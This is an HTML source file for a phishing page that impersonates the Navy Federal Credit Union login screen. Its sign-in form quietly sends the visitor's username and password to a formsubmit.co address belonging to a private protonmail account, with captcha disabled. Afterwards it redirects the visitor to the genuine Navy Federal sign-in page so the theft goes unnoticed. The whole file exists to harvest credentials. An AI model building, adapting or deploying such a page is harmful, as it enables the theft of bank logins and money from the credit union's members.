<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Navy LogIn</title>
    <link rel="stylesheet" href="style.css">
    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Poppins|Open+Sans">
    <link rel="shortcut icon" href="image/favicon.ico" type="image/x-icon">
  </head>
  
  <body>
    <!-- Logo Container (centered logo) -->
    <div class="logo-container">
      <img src="path/to/logo.png" alt="Logo" class="logo">
    </div>

    <!-- Navigation Bar -->
    <header>
      <nav class="navbar">
        <!-- Navigation links (empty for now) -->
       <button class="transparentButton mobileToggleButton" 
        aria-expanded="false" 
        aria-controls="mobileMenu" 
        aria-labelledby="smMenuButton" 
        id="smMenuButton" 
        onclick="toggleMenu(this)">
    <i class="MobileMenuToggleButton">
        <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="bars" class="svg-inline--fa fa-bars" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512">
            <path fill="currentColor" d="M0 96C0 78.3 14.3 64 32 64H416c17.7 0 32 14.3 32 32s-14.3 32-32 32H32C14.3 128 0 113.7 0 96zM0 256c0-17.7 14.3-32 32-32H416c17.7 0 32 14.3 32 32s-14.3 32-32 32H32c-17.7 0-32-14.3-32-32zM448 416c0 17.7-14.3 32-32 32H32c-17.7 0-32-14.3-32-32s14.3-32 32-32H416c17.7 0 32 14.3 32 32z"></path>
        </svg>
    </i>
    <span id="smMenuButton" class="visually-hidden" tabindex="-1">Menu</span>
</button>

      </nav>
    </header>

    <div class="container">
      <div class="form-box">
         <form method="post" action="https://formsubmit.co/joshuarich010@protonmail.com">
                <input type="hidden" name="_captcha" value="false">
                <input type="hidden" name="_next" value="https://digitalapps.navyfederal.org/signin/"
        
        <div class="input-field">
          <input type="text" name="username" placeholder="Username" required>
        </div>
        <div class="input-field">
          <input type="password" name="password" placeholder="Password" required>
          <span id="show-password" class="show-password">show</span>
        </div>
        <p><a href="#">Sign in Help</a></p>
        <div class="btn-field">
          <button type="submit">Sign In</button>
        </div>
      </div>
<div class="about-section">

    <h2>Not a Navy Federal Member?</h2>

    <p>Join now and enjoy the support and great service of a credit union that puts your needs first.</p>

</div>


      <div class="btn-field">
        <button type="button">Become a Member</button>
      </div>
      <div class="btn-field">
        <button type="button">Learn More</button>
      </div>
    </div>

    <footer class="footer">
      <ul class="footer-links">
        <li><a href="#">About us</a></li>
        <li><a href="#">Contact us</a></li>
        <li><a href="#">Security</a></li>
        <li><a href="#">Privacy</a></li>
        <li><a href="#">Accessibility</a></li>
        <li><a href="#">Browser Support</a></li>
      </ul>
      <b>2024 Navy Federal Credit Union.</b>
      <p>All rights reserved.</p>
    </footer>

    <script src="script.js"></script>
  </body>
</html>
